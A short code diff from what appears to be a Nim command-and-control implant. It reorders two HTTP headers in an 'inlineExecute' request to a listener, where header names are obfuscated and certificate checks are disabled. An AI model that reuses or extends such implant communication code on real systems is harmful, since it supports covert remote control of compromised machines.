@@ -339,8 +339,8 @@ proc inlineExecute*(li : Listener, args : varargs[string]) : string =
         headers: @[
                 Header(key: obf("User-Agent"), value: li.userAgent),
                 Header(key: obf("X-Request-ID"), value: li.id),
-                Header(key: obf("Content-MD5"), value: "inline-execute"), # Identifier for server
-                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
+                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey),
+                Header(key: obf("Content-MD5"), value: "inline-execute")
             ],
         allowAnyHttpsCertificate: true,
     )
